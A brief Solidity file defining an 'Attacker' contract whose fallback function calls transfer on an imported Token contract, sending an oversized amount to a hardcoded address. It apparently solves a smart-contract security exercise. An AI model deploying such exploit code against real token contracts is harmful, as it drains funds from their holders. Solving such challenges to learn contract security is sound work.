// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./Token.sol";

contract Attacker {
    Token public token;

    constructor(address _address) {
        token = Token(_address);
    }

    fallback() external payable {
        token.transfer(
            0x59e6b3D5D75Fa62c09Ca83f27CE97E0962D6d44E,
            1000000000000000900
        );
    }
}
